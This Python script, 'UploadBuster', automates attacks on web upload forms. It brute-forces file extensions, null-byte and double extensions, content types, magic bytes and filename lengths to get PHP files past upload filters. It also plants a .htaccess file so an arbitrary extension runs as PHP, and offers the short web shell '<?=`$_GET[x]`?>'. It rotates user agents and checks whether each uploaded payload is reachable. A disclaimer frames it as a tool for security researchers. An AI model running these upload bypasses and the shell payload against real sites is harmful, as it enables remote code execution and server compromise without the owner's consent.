print('''
   __  __      __                ______      
  / / / /___  / /___  ____ _____/ / __ )__  _______/ /____  _____
 / / / / __ \/ / __ \/ __ `/ __  / __  / / / / ___/ __/ _ \/ ___/
/ /_/ / /_/ / / /_/ / /_/ / /_/ / /_/ / /_/ (__  ) /_/  __/ /    
\____/ .___/_/\____/\__,_/\__,_/_____/\__,_/____/\__/\___/_/     
    /_/                                                          
''')

from random import randint, choice
from bs4 import BeautifulSoup
import urllib.parse
import requests
import json
import argparse
import uuid
import inspect
import re
from time import sleep

___banner = '''

   __  __      __                ______      
  / / / /___  / /___  ____ _____/ / __ )__  _______/ /____  _____
 / / / / __ \/ / __ \/ __ `/ __  / __  / / / / ___/ __/ _ \/ ___/
/ /_/ / /_/ / / /_/ / /_/ / /_/ / /_/ / /_/ (__  ) /_/  __/ /    
\____/ .___/_/\____/\__,_/\__,_/_____/\__,_/____/\__/\___/_/     
    /_/                                                          

'''


def args_handler():
    parser = argparse.ArgumentParser(prog="UploadBuster", formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description=f'''UploadBuster Was created to help Security Researchers locate unrestricted file upload vulnerabilities. Prim1Tive™ ''',
                                     epilog="legal disclaimer: \nUsage of UploadBuster for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")

    # values
    parser.add_argument("-u", "--url", help="Full url to the upload script [http://example.local/upload.php]", metavar='',
                        required=True)
    parser.add_argument("-b", "--backend", help="The backend language of the website [php,jsp,asp]", metavar='', required=True)
    parser.add_argument("-e", "--extensions",
                        help="Allowed extensions for the upload form [jpeg,docx,png,pdf, please put only one.]", metavar='',
                        required=True)
    parser.add_argument("-p", "--payload", default="PAYLOAD.php", metavar='',
                        help="Payload to sent, default: the preferred language hello script if not provided the script will be <?php echo HelloWorld;?>")
    parser.add_argument("-s", "--success-message", default="success", metavar='',
                        help='The success string of the upload script. [Upload was successful! uploads/image.jpg]')
    parser.add_argument("-d", "--data", default='submit,Upload', metavar='', help='Add custom data to the request [name,key]')
    parser.add_argument("-uv", "--upload-variable", default="file", metavar='',
                        help='main page upload php form variable (i.e form-data; name:###')
    parser.add_argument("-c", "--headers", metavar='', help='Add custom headers to the request')
    parser.add_argument("-i", "--intervals", default=0.0, type=float, metavar='', help='Add a delay between requests.')
    parser.add_argument("-to", "--request-time-out", default=3, type=int, metavar='', help='Add a delay between requests.')
    parser.add_argument("-re", "--request-redirects", action='store_true', help='Request Redirects flag.')

    # modes
    modes = parser.add_mutually_exclusive_group(required=True)
    modes.add_argument("-a", "--all-tests", help="Make the full test of Unrestricted File Upload on target",
                        action='store_true')
    modes.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing.', action='store_true')
    modes.add_argument("-bn", "--bruteforce-null-extension", help='Null Extension Brute forcing.', action='store_true')
    modes.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ',
                        action='store_true')
    modes.add_argument("-by", "--bruteforce-magic-bytes", help='Magic-bytes Brute forcing. ',
                        action='store_true')
    modes.add_argument("-bm", "--bruteforce-multi-extension", default=0, type=int, metavar='',
                        help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-bm [3] = jpg.php.php.php) ', )
    modes.add_argument("-br", "--bruteforce-reverse-multi-extension", default=0, type=int, metavar='',
                        help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-bm [3] = jpg.php.php.php) ', )
    modes.add_argument("-bl", "--bruteforce-filename-limit", help='Content-Type field Brute forcing. ',
                        action='store_true')
    modes.add_argument("-db", "--dont-brute", action='store_true',
                        help='if success message is found stop all tests. ')

    # tech
    parser.add_argument("-ts", "--tech-short-payload", action='store_true',
                        help='Try to set the shortest known php payload [<?=`$_GET[x]`?>]')
    parser.add_argument("-te", "--tech-execution-extension",
                        help='Try to edit .htaccess so it would treat extension as a php file extension. ',
                        action='store_true')

    # print args
    parser.add_argument("-vi", "--print-i", help="print the Request", action='store_true')
    parser.add_argument("-vo", "--print-o", help="print the Response", action='store_true')
    parser.add_argument("-v", "--print", action='store_true', help='full data of the request')
    parser.add_argument("-vs", "--verbal-success", action='store_false', help='Turn off success message [switch]')

    return parser.parse_args()


class UploadBuster:

    def __init__(self):
        # import configuration
        with open('json.json') as file:
            self._configuration = json.load(file)

        # argparse
        self.args = args_handler()
        self.args_user_payload_file_name = self.args.payload
        self.args_backend = self.args.backend
        self.args_allowed_ext = self.args.extensions
        self.args_success_message = self.args.success_message
        self.args_delay = self.args.intervals

        # request data
        self.request_url = self.args.url
        self.request_headers = dict()
        self.request_files = dict()
        self.request_data = dict()
        self.request_auth = dict()
        self.request_redirects = bool()
        self.request_time_out = self.args.request_time_out
        self._request_count = int()

        # payload data
        self.payload_upload_variable = self.args.upload_variable
        self.payload_file_name = str()
        self.payload_file_ext = str()
        self.payload_filename_full = self.payload_file_name + self.args_backend
        self.payload_content_type = str()
        self.payload_data = str()
        self.payload_href_link = str()
        self.payload_link_status_code = int()
        self._payload_url = str()

        # response
        self.response_success_message_line = str()

        # etc
        self.lst = [str.upper, str.lower]
        self._mode_name = str()
        self._success_payload = {}


    # settings
    def _set_payload_file_name(self, _new: str):
        self.payload_file_name = _new

    def _set_payload_file_ext(self, _new: str):
        self.payload_file_ext = _new

    def _set_payload_content_type(self, _new: str):
        self.payload_content_type = _new

    def _set_request_time_out(self, _new: int):
        self.request_time_out = _new

    def _set_request_redirects(self, _new: bool):
        self.request_redirects = _new

    def _set_payload_data(self, _new, _original=False):
        if _original:
            self.payload_data = open(self.args_user_payload_file_name, 'rb').read()
        else:
            self.payload_data = _new

    def _update_request_headers(self, _name: str, _key: str):
        self.request_headers.update({_name: _key})

    def _update_request_auth(self, _name: str, _key: str):
        self.request_auth.update({_name: _key})

    def _update_request_data(self, _name: str, _key: str):
        self.request_data.update({_name: _key})

    def _update_request_files(self, _name: str, _key: str):
        self.request_files.update({_name: _key})

    # adders
    def _add_random_user_agent_to_request(self):
        self._update_request_headers("user-agent", choice(self._configuration['config']['user-agents']))

    def _add_random_file_name_to_payload(self):
        self.payload_file_name = uuid.uuid4().hex[:randint(4, 7)]

    def _add_data_to_request(self):
        _name, _key = self.args.data.split(",")
        self._update_request_data(_name, _key)

    def _add_random_lower_and_upper_case_ext(self):
        self.payload_file_ext = ''.join(choice([str.upper, str.lower])(c) for c in self.payload_file_ext)

    # bruters
    def _bruter_file_ext(self):
        print(self._configuration['config']['+']['_bruter_file_ext'])
        for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_null_file_ext(self):
        print(self._configuration['config']['+']['_bruter_null_file_ext'])
        for self.payload_file_ext in self._configuration['exts']["null"]:
            self._set_payload_file_ext("." + self.args_backend + self.payload_file_ext)
            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_multi_ext(self):
        print(self._configuration['config']['+']['_bruter_multi_ext'])
        for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
            _temp = self.payload_file_ext
            for _loops in range(1, 8):
                self._set_payload_file_ext(self.payload_file_ext + _temp)
                self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_rev_multi_ext(self):
        print(self._configuration['config']['+']['_bruter_rev_multi_ext'])
        for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
            _temp = self.payload_file_ext
            for _loops in range(1, 8):
                self._set_payload_file_ext(_temp + self.payload_file_ext)
                self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_filename_limit(self):
        print(self._configuration['config']['+']['_bruter_filename_limit'])
        self._set_payload_content_type("application/x-php")
        for _index in range(999):
            self._set_payload_file_name(self.args.payload + (_index * "A"))
            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_content_type(self):
        print(self._configuration['config']['+']['_bruter_content_type'])
        for self.payload_content_type in self._configuration['content_types']:
            self._set_payload_file_ext("." + self.args_backend)
            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    def _bruter_magic_bytes(self):
        print(self._configuration['config']['+']['_bruter_magic_bytes'])
        for _magic_bytes_extension in self._configuration['magic_bytes']:
            for _magic_bytes in self._configuration['magic_bytes'][_magic_bytes_extension]:
                self._set_payload_data(str(bytes.fromhex(_magic_bytes)).replace("b'", "")[0:-1]+"\n<?php echo HelloWorld;?>")
                self._set_payload_file_ext(".php")
                self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    # tech
    def _tech_extension_blacklist_bypass(self):
        print(self._configuration['config']['+']['_tech_extension_blacklist_bypass'])

        def upload_htaccess():
            self._set_payload_file_name(".htaccess")
            self._set_payload_file_ext("")
            self._set_payload_content_type("application/x-php")
            self.args_user_payload_file_name = ".htaccess"
            self._mode_name = inspect.currentframe().f_code.co_name
            self._refresh_format()
            self._send_post_request()

        def upload_new_payload():
            self._add_random_file_name_to_payload()
            self._set_payload_file_ext(".wtf")
            self._set_payload_content_type("application/x-php")
            self.args_user_payload_file_name = self.args.payload
            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

        upload_htaccess()
        upload_new_payload()

    def _tech_short_php_payload(self):
        self._set_payload_data("<?=`$_GET[x]`?>")
        self._set_payload_file_ext(".php")
        self._send_formatted_request_print(inspect.currentframe().f_code.co_name)

    # validation
    def _extract_html_attribute_links_from_string(self, _string, _attribute_name):
        self.payload_href_link = re.findall(re.compile(f'{_attribute_name}="([^"]*)"'), _string)

    def _build_payload_url_link(self):
        self._payload_url = urllib.parse.urljoin(self.request_url, self.payload_href_link[0])

    def _extract_strings_from_html(self, _req):
        soup = BeautifulSoup(_req)
        print(soup.text.replace('\n',' '))

    def _check_site_alive(self):
        _req = requests.get(self._payload_url)
        self.payload_link_status_code = _req.status_code
        if self.payload_link_status_code == 200:
            # if _string in _req.text:
            return _req
        else:
            pass


    def _get_strings_from_html(self):
        _req = self._check_site_alive()
        try:
            _req = _req.text.split(' ')
            new_list = list(filter(None, _req))
        except:
            pass


    def validation_main(self):
        self._build_payload_url_link()
        self._get_strings_from_html()
        # self._extract_strings_from_html()
        # validation part
        pass


    # core


    def _refresh_format(self):
        self.request_files.update({self.payload_upload_variable: (self.payload_file_name + self.payload_file_ext,
                                                                  self.payload_data,
                                                                  self.payload_content_type)})
        self.payload_filename_full = self.payload_file_name + self.args_backend

    def _send_post_request(self):
        self._add_random_lower_and_upper_case_ext()
        self.request = requests.post(self.request_url, headers=self.request_headers, files=self.request_files,
                                     data=self.request_data, timeout=1, auth=self.request_auth,
                                     allow_redirects=True)
        sleep(self.args_delay)
        self._request_count += 1

    def _print_init(self, _mode: str = None):
        if self._if_success() and self.args.verbal_success:
            print(self._configuration['config']['+']['success_message']+f" PAYLOAD LINK: {self._payload_url} [{self.payload_link_status_code}]")
        if self.args.print_i:
            print(f'POST {self.request_url}\n{self.request_headers}\n{self.request_files} ')
        if self.args.print_o:
            print(f'POST {self.request_url}\n{self.request_headers}\n{self.request.text} ')
        if self.args.print:
            print(f'''> Mode: {self._mode_name}
    Payload:
        > URL: {self.request_url}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > HEADERS: {self.request_headers}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > FILE: {self.request_files}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > DATA: {self.request_data}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > SUCCESS LINE: {self.response_success_message_line}
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~
        > PAYLOAD LINK: {self._payload_url} [{self.payload_link_status_code}]
        ''')

        if self.args.dont_brute and self._if_success():
            quit()

    def _if_success(self):
        for _line in str(self.request.text.lower()).split("\n"):
            if self.args_success_message.lower() in _line.lower():
                self.response_success_message_line = _line.strip()
                self._success_payloads(self._request_count,str(f"{self._mode_name} ||| {self.request_data} ||| {self.request_files}"))
                self._extract_html_attribute_links_from_string(self.response_success_message_line,'href')
                self.validation_main()
                return True
        else:
            return False

    def _success_payloads(self, _key, _value):
        self._success_payload.update({_key: _value})

    def _send_formatted_request_print(self, _mode):
        self._mode_name = _mode
        self._refresh_format()
        self._send_post_request()
        self._print_init()

    def main(self):

        def main_init():
            self._set_payload_data('', _original=True)
            self._add_random_user_agent_to_request()
            self._add_random_file_name_to_payload()
            self._add_data_to_request()

            if self.args.tech_short_payload:
                self._tech_short_php_payload()

        main_init()
        if self.args.bruteforce_extension:
            self._bruter_file_ext()

        if self.args.bruteforce_filename_limit:
            self._bruter_filename_limit()

        if self.args.bruteforce_multi_extension:
            self._bruter_multi_ext()

        if self.args.bruteforce_null_extension:
            self._bruter_null_file_ext()

        if self.args.bruteforce_magic_bytes:
            self._bruter_magic_bytes()

        if self.args.bruteforce_content_type:
            self._bruter_content_type()

        if self.args.bruteforce_reverse_multi_extension:
            self._bruter_rev_multi_ext()

        elif self.args.all_tests:
            print("[+] Executing All tests")
            self._tech_extension_blacklist_bypass()
            # self._tech_short_php_payload()
            self._bruter_file_ext()
            self._bruter_null_file_ext()
            self._bruter_multi_ext()
            self._bruter_rev_multi_ext()
            self._bruter_magic_bytes()
            self._bruter_content_type()
            self._bruter_filename_limit()

            print(json.dumps(self._success_payload, indent=2))




if __name__ == '__main__':
    try:
        print(___banner)
        UploadBuster().main()
    except KeyboardInterrupt:
        print("[!] Exiting...")